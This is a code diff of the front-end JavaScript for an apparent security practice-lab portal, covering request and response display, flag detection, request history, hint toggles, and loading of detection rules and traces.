+          handleResponse(method, url, resp.status, resp.headers, text, elapsed);
+
+          // Auto-store JWT from login response
+          if (url.indexOf("/auth/login") !== -1 && resp.status === 200) {
+            try {
+              var data = JSON.parse(text);
+              if (data.token) {
+                sessionToken = data.token;
+                document.getElementById("session-indicator").textContent = "Authenticated";
+                document.getElementById("session-indicator").classList.add("authenticated");
+              }
+            } catch(e) {}
+          }
+        });
+      })
+      .catch(function(err) {
+        var elapsed = Math.round(performance.now() - startTime);
+        handleResponse(method, url, 0, null, "Network Error: " + err.message, elapsed);
+      });
   }
 
-  // Fire a challenge (POST)
-  async function fireChallengePost(url, contentType, body, cardEl, challengeId) {
-    const panel = document.getElementById('response-panel');
-    const content = document.getElementById('resp-content');
-    const status = document.getElementById('resp-status');
-    const lat = document.getElementById('resp-latency');
-    const dot = document.getElementById('resp-dot');
-    const flagBanner = document.getElementById('flag-banner');
+  function showLoading(method, url) {
+    document.getElementById("resp-method").textContent = method;
+    document.getElementById("resp-url").textContent = url;
+    document.getElementById("resp-status").textContent = "Loading...";
+    document.getElementById("resp-time").textContent = "";
+    document.getElementById("resp-dot").className = "status-dot";
+    document.getElementById("resp-output").textContent = "Sending request...";
+    document.getElementById("resp-flags").style.display = "none";
+  }
 
-    cardEl.classList.add('loading');
-    panel.classList.add('visible');
-    content.textContent = 'Loading...';
-    flagBanner.style.display = 'none';
+  function handleResponse(method, url, status, headers, body, elapsed) {
+    // Update response panel
+    document.getElementById("resp-method").textContent = method;
+    document.getElementById("resp-url").textContent = url;
+    document.getElementById("resp-status").textContent = status || "ERR";
+    document.getElementById("resp-time").textContent = elapsed + "ms";
 
-    const start = performance.now();
-    totalRequests++;
-    otelSpanCount++;
-    updateMetrics();
+    var dot = document.getElementById("resp-dot");
+    dot.className = "status-dot " + (status >= 200 && status < 400 ? "ok" : "err");
 
+    // Format body
+    var formatted = body;
     try {
-      const resp = await fetch(url, { method: 'POST', headers: { 'Content-Type': contentType }, body: body });
-      const elapsed = Math.round(performance.now() - start);
-      latencies.push(elapsed);
-      const text = await resp.text();
+      formatted = JSON.stringify(JSON.parse(body), null, 2);
+    } catch(e) {}
+    document.getElementById("resp-output").textContent = formatted;
 
-      let formatted;
-      try { formatted = JSON.stringify(JSON.parse(text), null, 2); }
-      catch { formatted = text.substring(0, 3000); }
-
-      status.textContent = 'HTTP ' + resp.status;
-      lat.textContent = elapsed + 'ms';
-      content.textContent = formatted;
-      dot.className = resp.ok ? 'status-dot ok' : 'status-dot err';
-      if (!resp.ok) totalErrors++;
-
-      const flagMatch = text.match(/FLAG\{[^}]+\}/);
-      if (flagMatch && !flagsCaptured.has(flagMatch[0])) {
-        flagsCaptured.add(flagMatch[0]);
-        solvedChallenges.add(challengeId);
-        flagBanner.textContent = flagMatch[0];
-        flagBanner.style.display = 'block';
-        cardEl.classList.add('solved');
-        document.getElementById('flags-captured').textContent = flagsCaptured.size;
-        document.getElementById('score-badge').textContent = flagsCaptured.size + ' / 10 Flags';
-      }
-    } catch (err) {
-      const elapsed = Math.round(performance.now() - start);
-      latencies.push(elapsed);
-      status.textContent = 'FAILED';
-      lat.textContent = elapsed + 'ms';
-      content.textContent = err.message;
-      dot.className = 'status-dot err';
-      totalErrors++;
+    // Check for flags
+    var flagMatch = body.match(/FLAG\{[^}]+\}/g);
+    var flagPanel = document.getElementById("resp-flags");
+    if (flagMatch) {
+      flagPanel.style.display = "block";
+      flagPanel.textContent = "FLAG CAPTURED: " + flagMatch.join(", ");
+    } else {
+      flagPanel.style.display = "none";
     }
 
-    cardEl.classList.remove('loading');
-    updateMetrics();
+    // Add to history
+    requestHistory.unshift({
+      time: new Date().toLocaleTimeString(),
+      method: method,
+      url: url,
+      status: status,
+      elapsed: elapsed,
+      body: formatted
+    });
+    renderHistory();
   }
 
-  // Fire a UX scenario (uses UX tab response panel)
-  async function fireUxScenario(url, cardEl) {
-    const panel = document.getElementById('ux-response-panel');
-    const content = document.getElementById('ux-resp-content');
-    const status = document.getElementById('ux-resp-status');
-    const lat = document.getElementById('ux-resp-latency');
-    const dot = document.getElementById('ux-resp-dot');
+  function clearResponse() {
+    document.getElementById("resp-method").textContent = "-";
+    document.getElementById("resp-url").textContent = "-";
+    document.getElementById("resp-status").textContent = "-";
+    document.getElementById("resp-time").textContent = "-";
+    document.getElementById("resp-dot").className = "status-dot";
+    document.getElementById("resp-output").textContent = "Response cleared.";
+    document.getElementById("resp-flags").style.display = "none";
+  }
+  window.clearResponse = clearResponse;
 
-    cardEl.classList.add('loading');
-    panel.classList.add('visible');
-    content.textContent = 'Loading...';
+  // ── Request History ────────────────────────────
+  function renderHistory() {
+    var tbody = document.getElementById("history-rows");
+    var countEl = document.getElementById("history-count");
+    countEl.textContent = "(" + requestHistory.length + ")";
 
-    const start = performance.now();
-    totalRequests++;
-    otelSpanCount++;
-    updateMetrics();
-
-    try {
-      const resp = await fetch(url);
-      const elapsed = Math.round(performance.now() - start);
-      latencies.push(elapsed);
-      const text = await resp.text();
-
-      let formatted;
-      try { formatted = JSON.stringify(JSON.parse(text), null, 2); }
-      catch { formatted = text.substring(0, 3000); }
-
-      status.textContent = 'HTTP ' + resp.status;
-      lat.textContent = elapsed + 'ms';
-      content.textContent = formatted;
-      dot.className = resp.ok ? 'status-dot ok' : 'status-dot err';
-      if (!resp.ok) totalErrors++;
-    } catch (err) {
-      const elapsed = Math.round(performance.now() - start);
-      latencies.push(elapsed);
-      status.textContent = 'FAILED';
-      lat.textContent = elapsed + 'ms';
-      content.textContent = err.message;
-      dot.className = 'status-dot err';
-      totalErrors++;
-    }
-
-    cardEl.classList.remove('loading');
-    updateMetrics();
+    tbody.innerHTML = "";
+    requestHistory.slice(0, 50).forEach(function(entry, idx) {
+      var tr = document.createElement("tr");
+      var statusClass = entry.status >= 200 && entry.status < 400 ? "success" : "error";
+      tr.innerHTML =
+        "<td>" + entry.time + "</td>" +
+        "<td><span class='resp-tag'>" + entry.method + "</span></td>" +
+        "<td class='mono-text'>" + escapeHtml(entry.url) + "</td>" +
+        "<td><span class='badge badge-" + statusClass + "'>" + entry.status + "</span></td>" +
+        "<td>" + entry.elapsed + "ms</td>" +
+        "<td><button class='form-btn form-btn-sm' onclick='replayHistory(" + idx + ")'>View</button></td>";
+      tbody.appendChild(tr);
+    });
   }
 
-  // Run all challenges sequentially
-  async function runAllChallenges() {
-    const cards = document.querySelectorAll('#tab-challenges .challenge-card');
-    for (const card of cards) {
-      card.click();
-      await new Promise(r => setTimeout(r, 1500));
+  function toggleHistory() {
+    var body = document.getElementById("history-body");
+    var chev = document.getElementById("history-chevron");
+    if (body.classList.contains("open")) {
+      body.classList.remove("open");
+      chev.innerHTML = "&#9660;";
+    } else {
+      body.classList.add("open");
+      chev.innerHTML = "&#9650;";
     }
   }
+  window.toggleHistory = toggleHistory;
 
-  // Update live metrics
-  function updateMetrics() {
-    document.getElementById('metric-requests').textContent = totalRequests;
-    document.getElementById('metric-errors').textContent = totalErrors;
-    document.getElementById('otel-spans').textContent = otelSpanCount;
+  window.replayHistory = function(idx) {
+    var entry = requestHistory[idx];
+    if (!entry) return;
+    document.getElementById("resp-method").textContent = entry.method;
+    document.getElementById("resp-url").textContent = entry.url;
+    document.getElementById("resp-status").textContent = entry.status;
+    document.getElementById("resp-time").textContent = entry.elapsed + "ms";
+    document.getElementById("resp-dot").className = "status-dot " + (entry.status >= 200 && entry.status < 400 ? "ok" : "err");
+    document.getElementById("resp-output").textContent = entry.body;
 
-    if (latencies.length > 0) {
-      const avg = Math.round(latencies.reduce((a, b) => a + b, 0) / latencies.length);
-      document.getElementById('metric-avg-latency').textContent = avg + 'ms';
-
-      const satisfied = latencies.filter(l => l < 2000).length;
-      const tolerating = latencies.filter(l => l >= 2000 && l < 8000).length;
-      const apdex = ((satisfied + tolerating * 0.5) / latencies.length).toFixed(2);
-      const apdexEl = document.getElementById('metric-apdex');
-      apdexEl.textContent = apdex;
-      apdexEl.style.color = apdex >= 0.9 ? 'var(--success)' : apdex >= 0.7 ? 'var(--warning)' : 'var(--error)';
+    var flagMatch = entry.body.match(/FLAG\{[^}]+\}/g);
+    var flagPanel = document.getElementById("resp-flags");
+    if (flagMatch) {
+      flagPanel.style.display = "block";
+      flagPanel.textContent = "FLAG CAPTURED: " + flagMatch.join(", ");
+    } else {
+      flagPanel.style.display = "none";
     }
+
+    // Scroll to response panel
+    document.getElementById("response-panel").scrollIntoView({ behavior: "smooth" });
+  };
+
+  // ── Guide Toggles ─────────────────────────────
+  window.toggleGuide = function(header) {
+    var body = header.nextElementSibling;
+    var chev = header.querySelector(".chevron");
+    if (body.classList.contains("open")) {
+      body.classList.remove("open");
+      chev.innerHTML = "&#9654;";
+    } else {
+      body.classList.add("open");
+      chev.innerHTML = "&#9660;";
+    }
+  };
+
+  // ── Hint Cards ─────────────────────────────────
+  window.revealHint = function(card) {
+    var hidden = card.querySelector(".hint-hidden");
+    if (hidden) {
+      hidden.classList.toggle("revealed");
+    }
+  };
+
+  // ── Copy Command ───────────────────────────────
+  window.copyCmd = function(btn) {
+    var cmdBlock = btn.parentElement;
+    var text = cmdBlock.textContent.replace("Copy", "").trim();
+    navigator.clipboard.writeText(text).then(function() {
+      btn.textContent = "Copied!";
+      setTimeout(function() { btn.textContent = "Copy"; }, 1500);
+    });
+  };
+
+  // ── Detection Rules Loader ─────────────────────
+  function loadDetectionRules() {
+    fetch("/portal/api/detection-rules")
+      .then(function(r) { return r.json(); })
+      .then(function(data) {
+        var container = document.getElementById("detection-rules-list");
+        if (!data.rules || data.rules.length === 0) {
+          container.innerHTML = "<p class='text-muted'>No detection rules available.</p>";
+          return;
+        }
+        var html = '<table class="surface-table"><thead><tr>' +
+          '<th>ID</th><th>Name</th><th>Severity</th><th>MITRE</th><th>APM Query</th>' +
+          '</tr></thead><tbody>';
+        data.rules.forEach(function(rule) {
+          html += '<tr>' +
+            '<td><code>' + rule.id + '</code></td>' +
+            '<td>' + escapeHtml(rule.name) + '</td>' +
+            '<td><span class="badge badge-' + rule.severity + '">' + rule.severity + '</span></td>' +
+            '<td><code>' + rule.mitre_id + '</code></td>' +
+            '<td><code class="query-preview">' + escapeHtml((rule.apm_query || '').substring(0, 80)) + '...</code></td>' +
+            '</tr>';
+        });
+        html += '</tbody></table>';
+        container.innerHTML = html;
+      })
+      .catch(function() {});
   }
 
-  // Toggle walkthrough guide sections
-  function toggleGuide(header) {
-    const body = header.nextElementSibling;
-    const chevron = header.querySelector('.chevron');
-    const isOpen = body.classList.contains('open');
-    body.classList.toggle('open');
-    chevron.innerHTML = isOpen ? '&#9660;' : '&#9650;';
+  // ── Trace Loader (placeholder) ─────────────────
+  window.loadTraces = function() {
+    var container = document.getElementById("traces-list");
+    container.innerHTML = '<p class="text-muted">Loading traces from session history...</p>';
+
+    // Show traces from request history that have security implications
+    if (requestHistory.length === 0) {
+      container.innerHTML = '<p class="text-muted">No requests yet. Use the Practice Lab to generate traces.</p>';
+      return;
+    }
+
+    var html = '<div class="trace-entries">';
+    requestHistory.forEach(function(entry, idx) {
+      var isAttack = entry.body && (
+        entry.body.indexOf("FLAG{") !== -1 ||
+        entry.body.indexOf("security") !== -1 ||
+        entry.body.indexOf("attack") !== -1 ||
+        entry.status >= 400
+      );
+      var iconClass = isAttack ? "trace-attack" : "trace-normal";
+      html += '<div class="trace-entry ' + iconClass + '" onclick="replayHistory(' + idx + ')">' +
+        '<div class="trace-time">' + entry.time + '</div>' +
+        '<div class="trace-info">' +
+          '<span class="resp-tag">' + entry.method + '</span> ' +
+          '<span class="mono-text">' + escapeHtml(entry.url) + '</span>' +
+        '</div>' +
+        '<div class="trace-status">' +
+          '<span class="badge badge-' + (entry.status < 400 ? "success" : "error") + '">' + entry.status + '</span> ' +
+          entry.elapsed + 'ms' +
+        '</div>' +
+      '</div>';
+    });
+    html += '</div>';
+    container.innerHTML = html;
+  };
+
+  // ── Utility ────────────────────────────────────
+  function escapeHtml(str) {
+    if (!str) return "";
+    return str.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;");
   }
 
-  // OCI APM RUM initialization
-  const apmEndpoint = document.querySelector('meta[name="apm-endpoint"]')?.getAttribute('content') || '';
-  const apmPublicKey = document.querySelector('meta[name="apm-public-key"]')?.getAttribute('content') || '';
-  if (apmEndpoint && apmPublicKey) {
-    window.ociDataUploadEndpoint = apmEndpoint;
-    window.OracleAPMPublicDataKey = apmPublicKey;
-    const script = document.createElement('script');
-    script.src = apmEndpoint + '/static/jslib/apmrum.min.js';
-    script.crossOrigin = 'anonymous';
-    document.head.appendChild(script);
-  }
+  // ── Init ───────────────────────────────────────
+  loadDetectionRules();
+
+})();
 </script>
+
 </body>
 </html>
